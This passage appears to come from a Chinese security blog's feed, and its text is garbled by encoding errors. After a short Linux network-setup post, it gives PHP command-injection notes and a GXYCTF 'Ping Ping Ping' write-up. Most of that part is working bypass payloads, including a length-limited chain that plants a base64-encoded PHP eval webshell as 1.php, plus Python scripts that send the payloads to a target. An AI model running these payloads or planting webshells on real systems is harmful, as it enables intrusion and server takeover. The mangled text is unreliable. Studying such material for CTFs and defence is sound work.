alt="img"></p><p>æŸ¥çœ‹ä¸»æœºçš„ip(ç½‘æ®µæ˜¯192.168.5.0)</p><p><img src="/img/1722475245414-2.png" alt="img"></p><p>rootä¸‹å¼€å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p><img src="/img/1722475245415-3.png" alt="img"></p><p>è¿™é‡Œçš„address,ç½‘å…³å’Œæ©ç éƒ½è®¾ç½®æˆä¸€ä¸ªåˆ†æ®µçš„ï¼Œä¿®æ”¹å®Œæˆå:wqä¿å­˜ï¼Œç„¶åé‡å¯ç½‘å¡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æˆ‘ä»¬è™šæ‹Ÿæœºipï¼š192.168.5.76</p><p><img src="/img/1722475245415-4.png" alt="img"></p><p>pingä¸€ä¸‹ï¼Œæ˜¯è¿æ¥æˆåŠŸçš„</p><p><img src="/img/1722475245416-5.png" alt="img"></p><p>æœ¬åœ°pingä¸€ä¸‹</p><p><img src="/img/1722475245416-6.png" alt="img"></p><p>xshellè¾“å…¥ipï¼Œè´¦å·ï¼Œå¯†ç è¿æ¥ä¸Šäº†ï¼Œå‘œå‘œå‘œï¼Œå¤ªéš¾äº†</p><p><img src="/img/1722475245416-7.png" alt="img"></p><p>ç»ˆäºè¿˜æ˜¯åšåˆ°äº†ï¼</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2024/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="å¸¸è§å±é™©å‡½æ•°"><a href="#å¸¸è§å±é™©å‡½æ•°" class="headerlink" title="å¸¸è§å±é™©å‡½æ•°"></a>å¸¸è§å±é™©å‡½æ•°</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>system()å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤, å¹¶å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœç›´æ¥è¾“å‡ºåˆ°ç•Œé¢ä¸­, ä½¿ç”¨æ—¶ç›´æ¥åœ¨å‚æ•°ä¸­ä¼ å…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤å³å¯</p><h4 id="Passthru"><a href="#Passthru" class="headerlink" title="Passthru"></a>Passthru</h4><p>passthru()å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤, å¹¶å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸­, ä¸system()å‡½æ•°ä¸åŒçš„æ˜¯, å®ƒæ”¯æŒäºŒè¿›åˆ¶çš„æ•°æ®, æ›´å¤šçš„ç”¨äºæ–‡ä»¶, å›¾ç‰‡ç­‰æ“ä½œ, ä½¿ç”¨æ—¶ç›´æ¥åœ¨å‚æ•°ä¸­ä¼ é€’å­—ç¬¦ä¸²ç±»å‹çš„ç³»ç»Ÿå‘½ä»¤å³å¯</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>shell_exec()å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤, ä½†å®ƒä¸ä¼šç›´æ¥è¾“å‡ºæ‰§è¡Œçš„ç»“æœ, è€Œæ˜¯è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å˜é‡æ¥å­˜å‚¨ç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œç»“æœ, åœ¨å‚æ•°ä¸­ä¼ é€’éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤å³å¯</p><h4 id="åå¼•å·"><a href="#åå¼•å·" class="headerlink" title="åå¼•å·"></a>åå¼•å·</h4><p>åå¼•å·å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤, ä½†å®ƒä¸ä¼šè¾“å‡ºç»“æœ, è€Œæ˜¯è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å˜é‡, ç”¨æ¥å­˜å‚¨ç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œç»“æœ, å¯å•ç‹¬ä½¿ç”¨, ä¹Ÿå¯é…åˆå…¶ä»–å‘½ä»¤æ‰§è¡Œå‡½æ•°ä½¿ç”¨æ¥ç»•è¿‡å‚æ•°ä¸­çš„è¿‡æ»¤æ¡ä»¶</p><h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>popen()å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤, ä½†ä¸ä¼šè¾“å‡ºæ‰§è¡Œçš„ç»“æœ, è€Œæ˜¯è¿”å›ä¸€ä¸ªèµ„æºç±»å‹çš„å˜é‡ç”¨æ¥å­˜å‚¨ç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œç»“æœ, éœ€è¦é…åˆfread()å‡½æ•°æ¥è¯»å–å‘½ä»¤çš„æ‰§è¡Œç»“æœ</p><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><p>proc_open â€” æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”æ‰“å¼€ç”¨æ¥è¾“å…¥&#x2F;è¾“å‡ºçš„æ–‡ä»¶æŒ‡é’ˆã€‚</p><p>å‚æ•°ï¼šcommand    descriptor_spec    pipes   </p><p>ä½œç”¨ç±»ä¼¼äºpopen</p><h3 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h3><h4 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h4><p>1ï¼šåˆ©ç”¨å¤§æ‹¬å·è¿›è¡Œç»•è¿‡</p><p><strong>?<strong><strong>cmd</strong></strong>{<strong><strong>ls</strong></strong>,-l}</strong></p><p>2:$IFSä»£æ›¿ç©ºæ ¼ï¼›$IFS,${IFS},$IFS$9</p><p>3:é‡å®šå‘å­—ç¬¦  &lt;,&lt;&gt;</p><p>â€œ&lt;â€è¡¨ç¤ºçš„æ˜¯è¾“å…¥é‡å®šå‘çš„æ„æ€ï¼Œå°±æ˜¯æŠŠ&lt;åé¢è·Ÿçš„æ–‡ä»¶å–ä»£é”®ç›˜ä½œä¸ºæ–°çš„è®¾å¤‡</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;cat&lt;flag.php</strong></p><p>4:%09(Tab)</p><p>payloadä¸º</p><p><strong>?cmd&#x3D;cat%09flag.php</strong></p><h5 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>**[GXYCTF 2019]**<strong>Ping</strong> <strong>Ping Ping</strong></p><p>pingæ˜¯ipçš„ä¸€ä¸ªå‚æ•°:å¯ä»¥è”æƒ³åˆ°127.0.0.1</p><p>æŸ¥çœ‹å½“å‰å­˜åœ¨çš„ç›®å½•æ–‡ä»¶å¤¹ï¼š?ip&#x3D;127.0.0.1;ls</p><p><img src="/img/1722310534823-4.png" alt="img"></p><p>æ‰¾åˆ°flag.php,index.php</p><p>cat flag.php,å‘ç°ç©ºæ ¼ç»•è¿‡ï¼Œè¿™é‡Œä½¿ç”¨$IFS$9è¿›è¡Œç»•è¿‡</p><p><img src="/img/1722310534824-5.png" alt="img"></p><p>cat index.php</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">        |\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">                        print_r($match);</span></span><br><span class="line"><span class="string">                        print($ip);</span></span><br><span class="line"><span class="string">                        echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">                echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">                print_r($a);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        ?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å¯¹flagå­—ç¬¦è¿›è¡Œäº†ç»•è¿‡ï¼Œ</p><ul><li>å¦‚æœè¾“å…¥çš„ IP åœ°å€ä¸­åŒ…å«ç‰¹æ®Šç¬¦å·ï¼ˆå¦‚ |()[]{}&#x2F;â€œï¼‰æˆ–è€…ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ &amp;&#x2F;?*()&lt;ç©ºæ ¼&gt;ï¼‰ï¼Œåˆ™ä¼šè¾“å‡º â€œfxck your symbol!â€ã€‚</li><li>å¦‚æœè¾“å…¥çš„ IP åœ°å€ä¸­åŒ…å«ç©ºæ ¼ï¼Œåˆ™ä¼šè¾“å‡º â€œfxck your space!â€ã€‚</li><li>å¦‚æœè¾“å…¥çš„ IP åœ°å€ä¸­åŒ…å« â€œbashâ€ å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šè¾“å‡º â€œfxck your bash!â€ã€‚</li><li>å¦‚æœè¾“å…¥çš„ IP åœ°å€ä¸­åŒ…å« â€œflagâ€ å­—ç¬¦ä¸²ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œåˆ™ä¼šè¾“å‡º â€œfxck your flag!â€ã€‚</li><li>æœ€åï¼Œæ— è®ºå¦‚ä½•éƒ½ä¼šæ‰§è¡Œä¸€ä¸ª ping å‘½ä»¤æ¥æµ‹è¯•è¾“å…¥çš„ IP åœ°å€ï¼Œå¹¶è¾“å‡º ping çš„ç»“æœã€‚</li></ul><p>è§£é¢˜æ€è·¯ï¼š ï¼ˆ1ï¼‰<strong>åˆ›å»ºå˜é‡å®ç°å­—ç¬¦ä¸²æ‹¼æ¥</strong>ï¼šæ„é€ **&#x2F;?<strong><strong>ip</strong></strong>&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$<strong><strong>IFS</strong></strong>$1$a$b.php**å³å¯è·å–flag æ³¨ï¼šæ­¤å¤„å°†å˜é‡abçš„ä½ç½®äº’æ¢æ˜¯ä¸ºäº†ç»•è¿‡å­—ç¬¦ä¸²åŒ¹é…ï¼ˆå†…è”æ‰§è¡Œï¼‰</p><p>ï¼ˆ2ï¼‰<strong>é€šè¿‡æ‰§è¡Œshå‘½ä»¤æ¥æ‰§è¡Œ</strong> ï¼ˆbashè¢«è¿‡æ»¤äº†ï¼Œä¸ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œï¼‰</p><p>æ„é€ **&#x2F;?ip&#x3D;127.0.0.1;echo$<strong><strong>IFS</strong></strong>$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh**</p><p>æ³¨ï¼šshæ˜¯linuxä¸­è¿è¡Œshellçš„å‘½ä»¤ï¼Œbashç›¸å½“äºshçš„å‡çº§ç‰ˆï¼Œshâˆˆbash</p><h4 id="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡"><a href="#æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡" class="headerlink" title="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡"></a>æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡</h4><p>1:é€šé…ç¬¦ <strong>ï¼Ÿ</strong> *****  è¿›è¡Œç»•è¿‡</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(â€˜cat f?ag.p?pâ€™)</strong></p><p>2:å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(â€˜cat flâ€â€â€˜ag.phâ€â€p);</strong></p><p>3:åæ–œæ \ç»•è¿‡</p><p>æŠŠç‰¹æ®Šå­—ç¬¦å»æ‰åŠŸèƒ½æ€§ï¼Œå•çº¯è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²</p><p> <strong>echo 1&gt;2</strong></p><p> <strong>1&gt;2</strong></p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(â€˜cat fl\ag.p\hpâ€™)</strong></p><p>4:ç‰¹æ®Šå˜é‡</p><p>$1åˆ°$9,$@å’Œ$*  è¾“å‡ºä¸ºç©º</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(â€˜cat fl$1ag.p$9hpâ€™)</strong></p><p>5:å†…è”æ‰§è¡Œï¼šå³è‡ªå®šä¹‰å­—ç¬¦ä¸²ï¼Œåœ¨æ‹¼æ¥èµ·æ¥</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(â€˜a&#x3D;f;d&#x3D;<strong><strong>ag</strong></strong>;c&#x3D;l;cat $a$c$dâ€™)</strong></p><h4 id="æ— å›æ˜¾æ—¶é—´ç›²æ³¨"><a href="#æ— å›æ˜¾æ—¶é—´ç›²æ³¨" class="headerlink" title="æ— å›æ˜¾æ—¶é—´ç›²æ³¨"></a>æ— å›æ˜¾æ—¶é—´ç›²æ³¨</h4><p>å‘½ä»¤ç›²æ³¨</p><p>é¡µé¢æ— æ³•shellåå¼¹æˆ–è€…æ— æ³•å›æ˜¾ï¼Œæˆ–è€…æ²¡æœ‰å†™å…¥æƒé™ï¼Œå¯ä»¥å°è¯•å‘½ä»¤ç›²æ³¨,æ ¹æ®è¿”å›æ—¶é—´æ¥è¿›è¡Œåˆ¤æ–­</p><p>ç›¸å…³å‘½ä»¤</p><p>1:sleep</p><p>2:awk NR&#x3D;&#x3D;1   #awké€è¡Œè·å–æ•°æ®</p><p>3:cut -c   #é€ä¸ªè·å–å•ä¸ªå­—ç¬¦</p><p><img src="/img/1722310534824-6.png" alt="img"></p><p>4:ifåˆ¤æ–­è¯­å¥ä½¿ç”¨</p><p>If [ $(cat flag.php | awk NR&#x3D;&#x3D;1 | cut -c 1 ) &#x3D;&#x3D; f] then echo â€œrightâ€;fi</p><h4 id="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡"><a href="#å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡" class="headerlink" title="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡"></a>å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡</h4><p>1:tac  åå‘æ˜¾ç¤ºï¼›</p><p>**?<strong><strong>cmd</strong></strong>&#x3D;system(â€œ**<strong>tac</strong> <strong>fl\ag.p\hpâ€);</strong></p><p>2:more  ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹ï¼›</p><p>3:less   ä¸moreç±»ä¼¼ï¼›</p><p>4:tali   æŸ¥çœ‹æœ«å°¾å‡ è¡Œï¼›</p><p>é»˜è®¤æ˜¾ç¤ºæœ€ååè¡Œ</p><p>5:nl   æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·ï¼›</p><p>6:od   ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ï¼›</p><p>Ascillè½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„å½¢å¼</p><p>7:xxd  è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ï¼›</p><p>ç±»ä¼¼äº010é‡Œçš„å·¦16è¿›åˆ¶å³å­—ç¬¦ä¸²çš„å½¢å¼</p><p>8:sort  ä¸»è¦ç”¨äºæ’åºæ–‡ä»¶ï¼›</p><p>ç»å¯¹è·¯å¾„ï¼‹sort+flag,php</p><p>9:uniq  æŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„è¡Œï¼›</p><p>10:file -f  æŠ¥é”™å‡ºå…·ä½“å†…å®¹ï¼›</p><p>11:grep   åœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šå†…å®¹çš„å­—ç¬¦ä¸²ï¼›</p><p>?cmd&#x3D;passthru(â€œgrep fla fla*â€)</p><p>è§£æï¼šä»æ–‡æœ¬flagé‡Œæœç´¢åŒ…å«â€œflaâ€å­—ç¬¦ä¸²çš„è¡Œ</p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><p>1:base64ç»•è¿‡</p><p>å°†cat flag.phpè½¬åŒ–ä¸ºbase64ç¼–ç è¿›è¡Œç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S=<span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64=base64.b64encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br></pre></td></tr></table></figure><p>å³cat flag.php -&gt; Y2F0IGZsYWcucGhw</p><p>2:base32ç»•è¿‡</p><p>åŒä¸Šè¿°base64ä¸€æ ·</p><h4 id="é•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#é•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="é•¿åº¦é™åˆ¶ç»•è¿‡"></a>é•¿åº¦é™åˆ¶ç»•è¿‡</h4><h5 id="é•¿åº¦ä¸º7ç»•è¿‡"><a href="#é•¿åº¦ä¸º7ç»•è¿‡" class="headerlink" title="é•¿åº¦ä¸º7ç»•è¿‡"></a>é•¿åº¦ä¸º7ç»•è¿‡</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]&lt;<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æŒæ¡çš„çŸ¥è¯†ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;a    <span class="comment">#è™½ç„¶æ²¡æœ‰è¾“å…¥ä½†æ˜¯ä¼šåˆ›å»ºaè¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line">ls -t    <span class="comment">#lsåŸºäºåŸºäºäº‹ä»¶æ’åºï¼ˆä»æ™šåˆ°æ—©ï¼‰</span></span><br><span class="line">sh a    <span class="comment">#shä¼šæŠŠaé‡Œé¢çš„æ¯è¡Œå†…å®¹å½“ä½œå‘½ä»¤æ¥æ‰§è¡Œ</span></span><br><span class="line">ä½¿ç”¨\è¿›è¡Œå‘½ä»¤æ‹¼æ¥    <span class="comment">#l\ s    =    ls</span></span><br><span class="line">base64    <span class="comment">#ä½¿ç”¨base64ç¼–ç é¿å…ç‰¹æ®Šå­—ç¬¦</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„ä¸€å¥è¯æœ¨é©¬&lt;?php eval($_GET[1]);ï¼Œç»è¿‡base64ç¼–ç åPD9waHAgZXZhbCgkX0dFVFsxXSk7</p><p>å³æˆ‘ä»¬æ‰€éœ€è¦æ‰§è¡Œçš„è¯­å¥ä¸º<strong>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</strong></p><p>æ„é€ payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1</span>.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;<span class="number">0</span></span><br><span class="line">sh <span class="number">0</span></span><br><span class="line"><span class="comment">#å› ä¸ºæ¶‰åŠåˆ°2æ¬¡å†™å…¥ï¼Œæ‰€ä»¥åé¢æœ‰2ä¸ªæ–œæ†</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i in f:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line">                requests.<span class="title function_ invoke__">get</span>(url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="é•¿åº¦ä¸º5ç»•è¿‡"><a href="#é•¿åº¦ä¸º5ç»•è¿‡" class="headerlink" title="é•¿åº¦ä¸º5ç»•è¿‡"></a>é•¿åº¦ä¸º5ç»•è¿‡</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å’Œé•¿åº¦ä¸º7çš„ä¸€æ ·çš„è§£æ³•ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿæœ‰å…¶ä»–è®¸å¤šè§£æ³•ï¼Œä¾‹å¦‚åå¼¹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;<span class="number">0</span></span><br><span class="line">&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;<span class="number">1</span>.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;<span class="number">64</span>\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;<span class="number">7</span>\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\</span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\</span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh <span class="number">0</span></span><br><span class="line">sh f            </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i in f:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line">        requests.<span class="title function_ invoke__">get</span>(url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="é•¿åº¦ä¸º4ç»•è¿‡"><a href="#é•¿åº¦ä¸º4ç»•è¿‡" class="headerlink" title="é•¿åº¦ä¸º4ç»•è¿‡"></a>é•¿åº¦ä¸º4ç»•è¿‡</h5><p>é¢„å¤‡çŸ¥è¯†ï¼š</p><p>1ï¼š<strong>è¾“å…¥ç»Ÿé…ç¬¦* 